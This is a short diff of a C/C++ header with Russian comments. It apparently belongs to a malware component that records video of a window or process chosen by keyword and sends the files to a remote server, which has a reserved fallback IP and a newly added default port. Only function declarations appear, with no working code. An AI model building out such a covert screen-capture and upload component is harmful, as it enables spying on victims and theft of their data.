@@ -18,11 +18,15 @@
 #define VIDEOREC_PARAM_ENCRYPTED_URLS false
 
 
+// порт сервера приёма видео
+const DWORD VIDEORECORD_DEFAULT_PORT = 700;
+
+
 
 void StartRecordThread(DWORD pid, PCHAR KeyWord, PCHAR ip, PCHAR ReservedIP, int port);//стартуем поток записи видео
 void StartRecordThread1(HWND hWnd,PCHAR KeyWord,PCHAR ip, PCHAR ReservedIP, int port);//стартуем поток записи видео
 void StopRecordThread();//останавливаем поток записи видео
-void StartSendThread(PCHAR Path,PCHAR ip, PCHAR ReservedIP, int port);//подгружаем длл и вызываем из нее ф-цию
+void VideoRecorderSendPath(PCHAR Path,PCHAR ip, PCHAR ReservedIP, int port);//подгружаем длл и вызываем из нее ф-цию
 
 //шлем либо просто либо передавая функцию в поток, параметр для которого директория
 void StartFindFields();
